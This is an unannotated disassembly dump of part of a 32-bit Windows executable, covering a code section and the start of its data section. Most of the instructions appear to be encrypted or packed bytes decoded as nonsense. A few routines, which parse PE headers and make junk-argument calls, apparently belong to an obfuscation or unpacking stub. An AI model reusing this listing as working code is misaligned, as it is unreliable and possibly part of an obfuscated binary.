  411326:	mov    esi,0x96cbbf24
  41132b:	fist   DWORD PTR [eax-0x3b821d6]
  411331:	xor    eax,0xccd6bb2b
  411336:	adc    al,0xbe
  411338:	mov    fs,WORD PTR [ebx+ebp*8]
  41133b:	inc    ebp
  41133c:	jge    0x411396
  41133e:	popa   
  41133f:	inc    ecx
  411340:	iret   
  411341:	imul   edx,DWORD PTR [edx-0x6c74d575],0xffffffa7
  411348:	pop    es
  411349:	push   esp
  41134a:	sub    eax,0x93399c2d
  41134f:	lock fld TBYTE PTR [edi]
  411352:	mov    ah,0x4e
  411354:	mov    ebx,0xffc8b9b5
  411359:	gs sahf 
  41135b:	xchg   esp,eax
  41135c:	xchg   DWORD PTR [ecx+0x18],esi
  41135f:	pop    es
  411360:	push   0xffffffc6
  411362:	sbb    edi,DWORD PTR [edi-0x35]
  411365:	mov    edi,DWORD PTR [edi]
  411367:	push   edx
  411368:	(bad)  
  41136a:	mov    eax,0x561153c0
  41136f:	xchg   edi,eax
  411370:	push   cs
  411371:	jmp    FWORD PTR [ecx+edi*8]
  411374:	sar    BYTE PTR [edx+edi*1],0x2
  411378:	std    
  411379:	outs   dx,DWORD PTR ds:[esi]
  41137a:	or     al,0xdf
  41137c:	das    
  41137d:	int    0xe5
  41137f:	inc    edx
  411380:	mov    eax,0x7b56f342
  411385:	dec    edx
  411386:	push   ecx
  411387:	push   0x49786960
  41138c:	pop    edx
  41138d:	mov    DWORD PTR [edi],edi
  41138f:	mov    bl,0x8e
  411391:	cmc    
  411392:	jmp    0x4113db
  411394:	xlat   BYTE PTR ds:[ebx]
  411395:	push   ss
  411396:	sbb    eax,DWORD PTR [eax-0x3a5694e8]
  41139c:	xor    al,0x20
  41139e:	adc    dl,BYTE PTR [ebp+edx*2+0x27]
  4113a2:	inc    ebp
  4113a3:	pop    esp
  4113a4:	je     0x4113bc
  4113a6:	or     eax,0xdeea6ae9
  4113ab:	fstp   st(7)
  4113ad:	jge    0x41139b
  4113af:	xchg   ebx,eax
  4113b0:	je     0x41138f
  4113b2:	push   cs
  4113b3:	sub    ah,BYTE PTR ds:0x13c0de5b
  4113b9:	inc    ebx
  4113ba:	inc    edx
  4113bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113bc:	jae    0x411355
  4113be:	retf   
  4113bf:	addr16 call edx
  4113c2:	cld    
  4113c3:	(bad)  
  4113c4:	aad    0x84
  4113c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113c7:	cmp    al,0x71
  4113c9:	inc    eax
  4113ca:	out    dx,eax
  4113cb:	(bad)  
  4113cc:	adc    ebx,DWORD PTR [eax+0x69]
  4113cf:	ja     0x4113fe
  4113d1:	in     eax,0x28
  4113d3:	or     BYTE PTR [ebp-0x7a],dh
  4113d6:	xor    al,0x6e
  4113d8:	imul   ecx,DWORD PTR [ecx+0x0],0xffffff85
  4113dc:	addr16 fwait
  4113de:	stos   DWORD PTR es:[edi],eax
  4113df:	fadd   st,st(2)
  4113e1:	push   ds
  4113e2:	leave  
  4113e3:	or     eax,0x1ca7e1aa
  4113e8:	cmc    
  4113e9:	xchg   ah,dl
  4113eb:	test   bh,al
  4113ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113ee:	and    eax,0x80f61533
  4113f3:	fistp  QWORD PTR [ebx]
  4113f5:	ret    0xcb64
  4113f8:	pop    es
  4113f9:	mov    ebx,0xca1d044c
  4113fe:	cmc    
  4113ff:	fs cli 
  411401:	push   ss
  411402:	dec    esi
  411403:	add    bh,al
  411405:	loope  0x4113e1
  411407:	add    DWORD PTR [esi],ebx
  411409:	xchg   DWORD PTR [esi-0xc80370b],ebp
  41140f:	lods   al,BYTE PTR ds:[esi]
  411410:	fist   DWORD PTR [esi]
  411412:	mov    al,ds:0xfcb6d57a
  411417:	pusha  
  411418:	mov    esp,0x54188e88
  41141d:	adc    al,0x25
  41141f:	in     al,dx
  411420:	imul   eax,DWORD PTR ds:0x96109652,0xfffffff8
  411427:	xlat   BYTE PTR ds:[ebx]
  411428:	add    BYTE PTR [eax],cl
  41142a:	sub    eax,0xe7628d12
  41142f:	stc    
  411430:	lods   eax,DWORD PTR ds:[esi]
  411431:	pushf  
  411432:	mov    DWORD PTR [ebx-0x6c],ecx
  411435:	mov    BYTE PTR [edx-0x4650e5e1],dl
  41143b:	in     al,0x9b
  41143d:	and    eax,0x2cd6b1c1
  411442:	inc    eax
  411443:	mov    ebx,0x5484bc17
  411448:	ret    0x3c8a
  41144b:	stos   BYTE PTR es:[edi],al
  41144c:	xor    eax,0x44a553b6
  411451:	or     eax,0x9ca8facf
  411456:	ret    0x9060
  411459:	mov    ds:0xe988920,al
  41145e:	mov    ebp,DWORD PTR [edi+0x6d]
  411461:	stc    
  411462:	fs inc di
  411465:	aam    0x51
  411467:	sbb    al,0x63
  411469:	or     eax,eax
  41146b:	popf   
  41146c:	or     al,0x91
  41146e:	jno    0x4114ba
  411470:	inc    esp
  411471:	(bad)  
  411472:	sub    edi,DWORD PTR [edi+0x50]
  411475:	iret   
  411476:	xchg   DWORD PTR [eax],eax
  411478:	(bad)  
  411479:	dec    edx
  41147a:	aam    0x5a
  41147c:	mov    ds:0xeb42cb3a,al
  411481:	sub    DWORD PTR [esi],esp
  411483:	stos   BYTE PTR es:[edi],al
  411484:	(bad)  
  411485:	mov    ch,0xb9
  411487:	cmp    dl,BYTE PTR [ecx]
  411489:	jmp    0x696d187d
  41148e:	cmp    BYTE PTR [esi+0x51a42bb],cl
  411494:	ficom  WORD PTR [ecx+edx*1-0x47e00a7]
  41149b:	pushf  
  41149c:	hlt    
  41149d:	sub    al,0xd5
  41149f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114a0:	inc    edx
  4114a1:	mov    DWORD PTR [ebx+0x5a],edi
  4114a4:	ins    BYTE PTR es:[edi],dx
  4114a5:	push   edx
  4114a6:	ja     0x4114df
  4114a8:	or     BYTE PTR [edx+edi*2-0x2e3d49ca],0x4
  4114b0:	sbb    BYTE PTR [ebx+edx*1+0x617a7810],dl
  4114b7:	sub    ebx,edi
  4114b9:	fdivr  DWORD PTR [edi]
  4114bb:	mov    WORD PTR [edi+0x79],es
  4114be:	fild   DWORD PTR [ebx+0x774da0d9]
  4114c4:	jg     0x411467
  4114c6:	adc    DWORD PTR [esi-0x6ab73aac],ebp
  4114cc:	jbe    0x41146e
  4114ce:	mov    esi,0x60026eb
  4114d3:	dec    eax
  4114d4:	call   0x13de3685
  4114d9:	jg     0x411488
  4114db:	push   ebp
  4114dc:	mov    ds:0xbdca9d36,al
  4114e1:	sub    eax,0x69745d22
  4114e6:	sbb    bh,BYTE PTR [ebx+esi*8]
  4114e9:	xchg   ebx,eax
  4114ea:	cld    
  4114eb:	dec    ebp
  4114ec:	mov    bh,0x97
  4114ee:	xor    BYTE PTR ds:0xa207f122,dl
  4114f4:	mov    dh,0xa
  4114f6:	adc    eax,0xcbd90e73
  4114fb:	sbb    eax,0xd6680da
  411500:	arpl   WORD PTR [edi],cx
  411502:	jae    0x411496
  411504:	sub    ebx,ebx
  411506:	sub    dl,dl
  411508:	pushf  
  411509:	mov    ecx,0x9d70ebd9
  41150e:	xchg   esi,eax
  41150f:	push   0x5b
  411511:	daa    
  411512:	outs   dx,BYTE PTR ds:[esi]
  411513:	psllw  mm5,0xdb
  411517:	adc    eax,0xbb60fd66
  41151c:	mov    bl,0x33
  41151e:	add    al,0x6
  411520:	hlt    
  411521:	add    DWORD PTR [ebx+ebx*8-0x55efe4c8],esp
  411528:	xor    eax,0xdbe47c0a
  41152d:	inc    esi
  41152e:	ret    0x415e
  411531:	mov    bl,0x9f
  411533:	mov    ebp,0x50a1284
  411538:	xchg   ecx,eax
  411539:	and    DWORD PTR [eax-0x146b796b],esp
  41153f:	sbb    BYTE PTR [ebp-0x7574cf9b],cl
  411545:	mov    ch,0x4
  411547:	mov    dh,0x11
  411549:	dec    edx
  41154a:	jmp    0x41153c
  41154c:	dec    esi
  41154d:	out    dx,al
  41154e:	(bad)  
  41154f:	sub    BYTE PTR [edx-0x74d14beb],dl
  411555:	ins    DWORD PTR es:[edi],dx
  411556:	xchg   edx,eax
  411557:	mov    ecx,0xd19fd9c8
  41155c:	test   DWORD PTR [edx],eax
  41155e:	inc    esi
  41155f:	in     al,dx
  411560:	lock ja 0x4115c4
  411563:	loopne 0x411556
  411565:	lock mov eax,ds:0x64ac6d37
  41156b:	jmp    0x411564
  41156d:	mov    ch,BYTE PTR [ecx-0x4c]
  411570:	(bad)  
  411572:	pop    es
  411573:	leave  
  411574:	popf   
  411575:	push   eax
  411576:	(bad)  
  411577:	pop    es
  411578:	stc    
  411579:	and    bh,BYTE PTR [edi]
  41157b:	pop    edi
  41157c:	add    ecx,DWORD PTR [esi-0x3c]
  41157f:	xor    DWORD PTR [esp+esi*1],eax
  411582:	cmp    esi,DWORD PTR [edi-0x50]
  411585:	fisub  WORD PTR [esi+0x1769b65c]
  41158b:	repnz es inc edi
  41158e:	outs   dx,DWORD PTR ds:[esi]
  41158f:	lods   eax,DWORD PTR ds:[esi]
  411590:	pusha  
  411591:	je     0x4115d6
  411593:	xchg   ebp,eax
  411594:	hlt    
  411595:	out    0x46,eax
  411597:	sub    eax,0x3828a15f
  41159c:	xlat   BYTE PTR ds:[ebx]
  41159d:	nop
  41159e:	sub    BYTE PTR [esi-0x457dca54],bl
  4115a4:	daa    
  4115a5:	push   edx
  4115a6:	out    0xa4,al
  4115a8:	pop    ebx
  4115a9:	daa    
  4115aa:	pushf  
  4115ab:	xchg   ecx,eax
  4115ac:	or     ch,BYTE PTR [esi+0x1d]
  4115af:	sbb    BYTE PTR [esp+ebp*8-0xb523525],ah
  4115b6:	imul   eax,ecx,0xffffff80
  4115b9:	pop    ebx
  4115ba:	xchg   DWORD PTR [esi-0x53],eax
  4115bd:	cld    
  4115be:	pop    esi
  4115bf:	gs out 0xd2,al
  4115c2:	add    ebp,esi
  4115c4:	ror    DWORD PTR [esi+eiz*8-0x4516fc72],0x36
  4115cc:	ret    0x28f4
  4115cf:	aaa    
  4115d0:	xchg   edi,eax
  4115d1:	add    BYTE PTR [ebx],al
  4115d3:	mov    edx,DWORD PTR ss:[ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	mov    bh,0x64
  41161a:	or     ebp,ecx
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x411631
  411625:	jnp    0x4115ff
  411627:	int3   
  411628:	xor    eax,0xe48fea43
  41162d:	inc    esp
  41162e:	test   eax,0xdeba34d0
  411633:	ror    DWORD PTR [edx*8-0x7fe8eb2b],0xf7
  41163b:	mov    ebx,0x8918c1bf
  411640:	xchg   DWORD PTR [edi+0x34],esp
  411643:	adc    dl,bl
  411645:	jmp    0x4115e2
  411647:	loopne 0x411664
  411649:	neg    BYTE PTR [edi-0x7d]
  41164c:	cwde   
  41164d:	inc    ecx
  41164e:	push   0x1cda98e0
  411653:	ja     0x4116ce
  411655:	dec    edx
  411656:	cdq    
  411657:	cwde   
  411658:	dec    edx
  411659:	aaa    
  41165a:	xchg   dl,cl
  41165c:	adc    dh,BYTE PTR [edi-0x7fd5b3b6]
  411662:	xor    eax,0x6e8acd2a
  411667:	ins    BYTE PTR es:[edi],dx
  411668:	data16 jecxz 0x411691
  41166b:	sbb    eax,0x4854364d
  411670:	inc    edi
  411671:	inc    esi
  411672:	fwait
  411673:	cmp    al,0xcd
  411675:	std    
  411676:	ficom  WORD PTR [edi+0x5a38c313]
  41167c:	cmp    bl,BYTE PTR [esi+esi*1]
  41167f:	fistp  WORD PTR [ebx]
  411681:	aas    
  411682:	aas    
  411683:	sahf   
  411684:	add    DWORD PTR [ecx-0x3],ecx
  411687:	dec    DWORD PTR [ecx]
  411689:	in     al,0x5e
  41168b:	loope  0x4116a3
  41168d:	jmp    0x5b70bae
  411692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411693:	and    al,0xb0
  411695:	or     edx,DWORD PTR [edi+0x34]
  411698:	jo     0x4116bf
  41169a:	lock out 0x54,al
  41169d:	xchg   edi,eax
  41169e:	and    BYTE PTR [ecx-0x7a],bl
  4116a1:	add    eax,0x6ef7957c
  4116a6:	adc    ebp,ebx
  4116a8:	or     dh,BYTE PTR [ebx-0x517c4c0e]
  4116ae:	cwde   
  4116af:	ins    BYTE PTR es:[edi],dx
  4116b0:	cmp    cl,BYTE PTR [edx]
  4116b2:	(bad)  
  4116b3:	sbb    al,0xd6
  4116b5:	dec    edi
  4116b6:	in     eax,0x50
  4116b8:	jmp    0xf09f:0xba708712
  4116bf:	sbb    al,0xcf
  4116c1:	in     al,dx
  4116c2:	adc    ch,0x9c
  4116c5:	das    
  4116c6:	out    0xdc,eax
  4116c8:	jecxz  0x41170b
  4116ca:	scas   al,BYTE PTR es:[edi]
  4116cb:	ficom  WORD PTR [esi+0x5]
  4116ce:	jbe    0x4116e8
  4116d0:	pop    edx
  4116d1:	adc    ecx,DWORD PTR [eax+edi*2]
  4116d4:	mov    ?,ebx
  4116d6:	push   edi
  4116d7:	xchg   DWORD PTR [edi+0x49],edi
  4116da:	ja     0x41166d
  4116dc:	outs   dx,DWORD PTR ds:[esi]
  4116dd:	mov    eax,ds:0xe787e65d
  4116e2:	jge    0x4116ad
  4116e4:	xlat   BYTE PTR ds:[ebx]
  4116e5:	gs push 0x10
  4116e8:	inc    ebp
  4116e9:	mov    dh,0x77
  4116eb:	retf   
  4116ec:	pushf  
  4116ed:	xor    al,0x34
  4116ef:	mov    ch,dl
  4116f1:	or     DWORD PTR [ecx-0x521d1b76],0x28fed9fc
  4116fb:	xchg   edx,eax
  4116fc:	outs   dx,DWORD PTR ds:[esi]
  4116fd:	pop    ds
  4116fe:	mov    eax,0x6cc42214
  411703:	ror    DWORD PTR [edi],cl
  411705:	jmp    0x4116bf
  411707:	sbb    ebx,DWORD PTR [esi+ebp*2]
  41170a:	dec    eax
  41170b:	mov    ch,0x5e
  41170d:	mov    esp,DWORD PTR [esi]
  41170f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411710:	sbb    bl,BYTE PTR [edx-0x24]
  411713:	mov    eax,DWORD PTR [edi]
  411715:	push   cs
  411716:	icebp  
  411717:	adc    DWORD PTR [esi+0x79],ecx
  41171a:	add    ch,0x7
  41171d:	loopne 0x411704
  41171f:	dec    edi
  411720:	adc    dh,BYTE PTR [edx-0x3]
  411723:	sub    al,0x1d
  411725:	inc    ebp
  411726:	cs xor eax,0x95df5a52
  41172c:	lahf   
  41172d:	mov    cl,0xe3
  41172f:	fdiv   QWORD PTR [ecx+0x70417624]
  411735:	push   ds
  411736:	outs   dx,DWORD PTR ds:[esi]
  411737:	mov    ss,WORD PTR [ebp+0x50]
  41173a:	gs jp  0x411752
  41173d:	mov    edi,0x31b15c2
  411742:	into   
  411743:	sbb    ebp,DWORD PTR [edi]
  411745:	jl     0x4117b7
  411747:	adc    al,0x56
  411749:	clc    
  41174a:	cmp    al,0x3b
  41174c:	into   
  41174d:	adc    eax,0x74ccbdf6
  411752:	mov    eax,ds:0xe3a993fa
  411757:	loope  0x411721
  411759:	dec    ebp
  41175a:	push   0xccc4252e
  41175f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411760:	jnp    0x41178b
  411762:	sbb    ecx,DWORD PTR [ecx]
  411764:	mov    bh,0x73
  411766:	hlt    
  411767:	out    dx,al
  411768:	jne    0x411787
  41176a:	adc    BYTE PTR [eax],ah
  41176c:	int3   
  41176d:	mov    ah,0xc4
  41176f:	popf   
  411770:	scas   eax,DWORD PTR es:[edi]
  411771:	mov    dh,0x16
  411773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411774:	les    esp,FWORD PTR [ebp-0x35]
  411777:	gs jb  0x41176f
  41177a:	in     eax,0x72
  41177c:	jae    0x4117f0
  41177e:	and    bh,bh
  411780:	xchg   edx,eax
  411781:	(bad)  
  411783:	stos   DWORD PTR es:[edi],eax
  411784:	scas   al,BYTE PTR es:[edi]
  411785:	hlt    
  411786:	jno    0x41178e
  411788:	dec    esi
  411789:	mov    BYTE PTR [esi],dh
  41178b:	fbld   TBYTE PTR [eax-0x96aa505]
  411791:	add    BYTE PTR [eax-0x46a85cb9],0xec
  411798:	sub    BYTE PTR [ecx-0x70632ba2],0x1d
  41179f:	loope  0x411800
  4117a1:	pop    ebx
  4117a2:	mov    cl,0xb7
  4117a4:	cwde   
  4117a5:	fcomip st,st(0)
  4117a7:	in     eax,0x37
  4117a9:	mov    fs,WORD PTR cs:[edi+ebp*8+0x4d22aa00]
  4117b1:	fstp   DWORD PTR [ecx+0x1e]
  4117b4:	ds jp  0x411777
  4117b7:	sbb    edi,ebp
  4117b9:	mov    al,ds:0xfd0ab6c
  4117be:	iret   
  4117bf:	mov    esi,0x273d509d
  4117c4:	or     DWORD PTR [esi],ebp
  4117c6:	rcr    DWORD PTR [ecx-0x18c187b3],cl
  4117cc:	and    BYTE PTR [ecx],dh
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x4337a3,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4336ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43379f,0x433703
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43379f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43371b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4337ab,0x0
  41182f:	mov    eax,ds:0x4337ab
  411834:	inc    eax
  411835:	mov    ds:0x4337ab,eax
  41183a:	cmp    DWORD PTR ds:0x4337ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4338bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4337ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4337ab
  411899:	inc    eax
  41189a:	mov    ds:0x4337ab,eax
  41189f:	cmp    DWORD PTR ds:0x4337ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	ins    DWORD PTR es:[edi],dx
  4118e8:	add    DWORD PTR [eax+0x7],esi
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411959
  4118f4:	jb     0x411933
  4118f6:	nop
  4118f7:	(bad)  
  4118f8:	dec    esi
  4118f9:	adc    DWORD PTR [ebx],esp
  4118fb:	outs   dx,DWORD PTR ds:[esi]
  4118fc:	xor    esp,DWORD PTR [edx+0x26]
  4118ff:	scas   eax,DWORD PTR es:[edi]
  411900:	hlt    
  411901:	hlt    
  411902:	(bad)  
  411903:	sub    eax,edx
  411905:	inc    edx
  411906:	mov    bl,0x5e
  411908:	and    al,0x4c
  41190a:	in     eax,dx
  41190b:	sub    esp,DWORD PTR [eax+0x6a]
  41190e:	pop    ds
  41190f:	mov    dh,0xc6
  411911:	xor    eax,0xbdf057f4
  411916:	out    dx,al
  411917:	pop    ebx
  411918:	mov    DWORD PTR [ebx+0x60],0xcd596bd2
  41191f:	jmp    0x4dcf8658
  411924:	lods   eax,DWORD PTR ds:[esi]
  411926:	add    ebp,eax
  411928:	(bad)  
  411929:	sbb    eax,0x8d65c485
  41192e:	mov    ds:0x14a616d3,al
  411933:	pop    ecx
  411934:	mov    eax,0xbd42247e
  411939:	sti    
  41193a:	jns    0x41194c
  41193c:	sti    
  41193d:	call   0x53f23a39
  411942:	int3   
  411943:	or     edx,DWORD PTR [edi]
  411945:	arpl   cx,cx
  411947:	icebp  
  411948:	push   ebp
  411949:	cmp    esi,edi
  41194b:	sub    DWORD PTR gs:[ecx],0x9a5ca443
  411952:	aas    
  411953:	sahf   
  411954:	jnp    0x411965
  411956:	jnp    0x41198d
  411958:	push   ebp
  411959:	mov    dh,0x49
  41195b:	iret   
  41195c:	adc    bl,cl
  41195e:	mov    ch,0x13
  411960:	outs   dx,BYTE PTR ds:[esi]
  411961:	jbe    0x41196d
  411963:	add    al,0xc6
  411965:	or     eax,0x6c4666da
  41196a:	add    BYTE PTR [ebx+0x71af9b21],bl
  411970:	outs   dx,BYTE PTR ds:[esi]
  411971:	jp     0x41198a
  411973:	dec    ebp
  411974:	out    dx,al
  411975:	mov    ebp,0x519054c9
  41197a:	mov    edi,0x56a921
  41197f:	repz sub ch,ch
  411982:	dec    edi
  411983:	mov    ah,0x21
  411985:	jl     0x411983
  411987:	aad    0x28
  411989:	xchg   ebp,eax
  41198a:	out    0x6f,eax
  41198c:	or     BYTE PTR [ebp+0x6da550e6],al
  411992:	sar    BYTE PTR [ebx],cl
  411994:	and    al,0xc2
  411996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411997:	mov    ah,0x5f
  411999:	lea    eax,[ecx]
  41199b:	mov    esi,0xb8077fa
  4119a0:	scas   eax,DWORD PTR es:[edi]
  4119a1:	add    BYTE PTR [edx+0x59],0xf9
  4119a5:	lock inc ebx
  4119a7:	sahf   
  4119a8:	push   eax
  4119a9:	cmp    eax,0xc7f281fa
  4119ae:	xor    al,0x97
  4119b0:	mov    edx,0x4456a7e7
  4119b5:	bound  ecx,QWORD PTR [esp+esi*1-0x6fab190c]
  4119bc:	jne    0x411a1a
  4119be:	les    ecx,FWORD PTR [edx+0x73]
  4119c1:	(bad)  
  4119c2:	jae    0x4119c9
  4119c4:	test   al,0xbd
  4119c6:	les    eax,FWORD PTR [ecx+0xac4e6a1]
  4119cc:	xchg   BYTE PTR [edi],ah
  4119ce:	inc    esp
  4119cf:	mov    eax,ds:0x3ec963b1
  4119d4:	mov    ebx,0x940d0938
  4119d9:	mov    ecx,0x2b31961c
  4119de:	ja     0x411a2f
  4119e0:	mov    ebp,0x4d1d80a4
  4119e5:	jno    0x4119f3
  4119e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e8:	inc    ebp
  4119e9:	es or  esi,ebp
  4119ec:	neg    ch
  4119ee:	scas   al,BYTE PTR es:[edi]
  4119ef:	pop    esp
  4119f0:	sbb    BYTE PTR [ecx+edi*8-0x6d20d462],ch
  4119f7:	adc    ch,BYTE PTR [eax+eiz*8]
  4119fa:	data16 mov dl,0xfe
  4119fd:	data16 rcl BYTE PTR [eax],1
  411a00:	das    
  411a01:	inc    ebx
  411a02:	mov    WORD PTR [edx],gs
  411a04:	pop    edx
  411a05:	and    BYTE PTR [edi+0x62],0x86
  411a09:	mov    cl,0x18
  411a0b:	cmc    
  411a0c:	push   ecx
  411a0d:	hlt    
  411a0e:	test   al,0x2b
  411a10:	mov    edi,0xd7f8ecbd
  411a15:	xor    eax,DWORD PTR [esi]
  411a17:	push   edi
  411a18:	loope  0x411a64
  411a1a:	jae    0x411a15
  411a1c:	pop    edx
  411a1d:	dec    ebp
  411a1e:	clc    
  411a1f:	lahf   
  411a20:	inc    eax
  411a21:	push   edx
  411a22:	imul   edi,esp,0xb2927ec4
  411a28:	or     al,al
  411a2a:	das    
  411a2b:	retf   
  411a2c:	and    al,0x56
  411a2e:	xchg   ecx,eax
  411a2f:	hlt    
  411a30:	mov    ds:0x483b051d,al
  411a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a36:	scas   eax,DWORD PTR es:[edi]
  411a37:	cs push 0x366326dc
  411a3d:	inc    edx
  411a3e:	sub    BYTE PTR [esi],0x32
  411a41:	inc    edx
  411a42:	xor    edi,DWORD PTR [eax]
  411a44:	xchg   esp,eax
  411a45:	xor    ch,dl
  411a47:	mov    al,ds:0x49b9b773
  411a4c:	shl    BYTE PTR [ebx+ebp*4],0xfe
  411a50:	fcomp  QWORD PTR [ecx+0x2695ff65]
  411a56:	jb     0x411a4c
  411a58:	sar    DWORD PTR [edx-0x7ba5a06d],1
  411a5e:	jnp    0x411a86
  411a60:	or     DWORD PTR ds:0x5d33c1c8,edi
  411a66:	pop    ss
  411a67:	mov    dh,0xf4
  411a69:	mov    dh,0xbc
  411a6c:	addr16 out dx,eax
  411a6e:	xor    bh,BYTE PTR [esi-0x12]
  411a71:	mov    ah,0x5d
  411a73:	rol    DWORD PTR [edx+0x2b],1
  411a76:	sub    DWORD PTR [esi+0x5e91306e],0xffffffe3
  411a7d:	sub    BYTE PTR [edi+0x1fecd02],cl
  411a83:	(bad)  
  411a84:	mov    cl,0xbe
  411a86:	icebp  
  411a87:	cmc    
  411a88:	cli    
  411a89:	and    DWORD PTR [eax+0x14],ecx
  411a8c:	xchg   edx,eax
  411a8d:	or     BYTE PTR [ebx],bl
  411a8f:	dec    esp
  411a90:	xchg   esi,eax
  411a91:	(bad)  
  411a92:	dec    esi
  411a93:	pop    esi
  411a94:	mov    fs,WORD PTR [esi+0x61]
  411a97:	mov    al,ds:0x4e19daec
  411a9c:	push   ds
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
